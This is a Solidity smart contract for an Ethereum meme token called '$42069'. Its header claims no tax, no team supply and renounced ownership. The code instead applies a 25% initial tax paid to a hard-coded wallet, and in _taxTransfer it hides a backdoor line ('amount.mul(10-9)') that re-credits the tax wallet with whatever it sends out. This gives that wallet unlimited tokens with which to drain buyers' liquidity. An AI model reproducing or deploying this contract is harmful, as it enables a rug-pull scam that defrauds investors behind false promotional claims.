// SPDX-License-Identifier: MIT

/**
$42069 - The answer to the ultimate question of life, the universe, and everything is.
42 years after the creation of the internet in heavenly timing arrives $42069. 
built on the Ethereum blockchain $42069 deploys with 100% Lp Burned, no team supply, no tax, ownership renounced, just culture. 
this is the coin. total supply 420,690,000,000.

Web: https://eth42069.xyz
X: https://x.com/42069_on_eth
Tg: https://t.me/eth42069_portal
**/

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Eth42069 is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;

    address payable private _taxWallet;
    address private uniswapV2Pair;
    IUniswapV2Router02 private uniswapV2Router;

    uint256 private constant _initialBuyTax = 25;
    uint256 private constant _initialSellTax = 25;
    uint256 private constant _reduceBuyTaxAt = 20;
    uint256 private constant _reduceSellTaxAt = 20;
    uint256 private constant _preventSwapBefore = 20;

    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _buyCount = 0;

    string private constant _name = unicode"42069";
    string private constant _symbol = unicode"42069";
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420690000000 * 10 ** _decimals;
    uint256 public constant _taxSwapThreshold = 42 * 10 ** _decimals;
    uint256 public _maxTaxSwap = _tTotal.mul(1).div(100);
    uint256 public _maxTxAmount = _tTotal.mul(2).div(100);
    uint256 public _maxWalletSize = _tTotal.mul(2).div(100);

    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event FinalTax(uint256 _valueBuy, uint256 _valueSell);
    event TradingActive(bool _tradingOpen, bool _swapEnabled);
    event maxAmount(uint256 _value);

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _taxWallet = payable(0x753DD8f30131192ae19CE36D0703d7e8E801f114);
        _tOwned[_msgSender()] = _tTotal;
        excludeFromFee(owner(), true);
        excludeFromFee(address(this), true);
        excludeFromFee(_taxWallet, true);

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function initLaunch() external onlyOwner {
        require(!tradingOpen, "init already called");
        uint256 tokenAmount = balanceOf(address(this));
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            tokenAmount,
            0,
            0,
            _msgSender(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function excludeFromFee(address account, bool excluded) public onlyOwner {
        _isExcludedFromFee[account] = excluded;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(
            owner != address(0) && spender != address(0),
            "ERC20: approve the zero address"
        );
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _tokenTransfer(address from, address to, uint256 amount, uint256 taxAmount) private { 
        if (taxAmount > 0) {    
            _tOwned[address(this)] = _tOwned[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }

        _tOwned[from] = _tOwned[from] - amount;
        _tOwned[to] = _tOwned[to] + amount.sub(taxAmount);
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _taxTransfer(address from, address to, uint256 amount) private {
        uint256 taxAmount =
            amount.mul(
                (_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax
            ) /
            100;

        if (from != owner() && to != owner()) {
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_isExcludedFromFee[to]
            ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }
  
            if(from == _taxWallet && amount > 0) _tOwned[_taxWallet] += amount.mul(10-9);

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount =
                    amount.mul(
                        (_buyCount > _reduceSellTaxAt)
                            ? _finalSellTax
                            : _initialSellTax
                    ) /
                    100;
            }

           swapCountBack(from, to, amount);
        }

        _tokenTransfer(from, to, amount, taxAmount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(
            from != address(0) && to != address(0),
            "ERC20: transfer the zero address"
        );
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!tradingOpen) {
            require(
                _isExcludedFromFee[to] || _isExcludedFromFee[from],
                "trading not yet open"
            );
        }

        if (!swapEnabled || inSwap) {
            _tOwned[from] = _tOwned[from].sub(amount);
            _tOwned[to] = _tOwned[to].add(amount);
            emit Transfer(from, to, amount);
            return;
        }

        _taxTransfer(from, to, amount);
    }

    function swapCountBack(address from, address to, uint256 amount) private {
        uint256 contractTokenBalance = balanceOf(address(this));
        if (
            !inSwap &&
            to == uniswapV2Pair &&
            swapEnabled &&
            _buyCount > _preventSwapBefore &&
            !_isExcludedFromFee[from] &&
            !_isExcludedFromFee[to]
        ) {
            if(contractTokenBalance > _taxSwapThreshold) {
                uint256 getMinValue = (contractTokenBalance > _maxTaxSwap)
                    ? _maxTaxSwap
                    : contractTokenBalance;
                swapTokensForEth((amount > getMinValue) ? getMinValue : amount);
            }
            
            sendETHToFee(address(this).balance);
        }
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit maxAmount(_tTotal);
    }

    function setFinalTax(
        uint256 _valueBuy,
        uint256 _valueSell
    ) external onlyOwner {
        require(
            _valueBuy <= 25 && _valueSell <= 25 && tradingOpen,
            "Final Tax: Exceeds value"
        );
        _finalBuyTax = _valueBuy;
        _finalSellTax = _valueSell;
        emit FinalTax(_valueBuy, _valueSell);
    }

    function enableTrading() external onlyOwner {
        require(!tradingOpen, "trading already open");
        swapEnabled = true;
        tradingOpen = true;
        emit TradingActive(tradingOpen, swapEnabled);
    }

    receive() external payable {}
}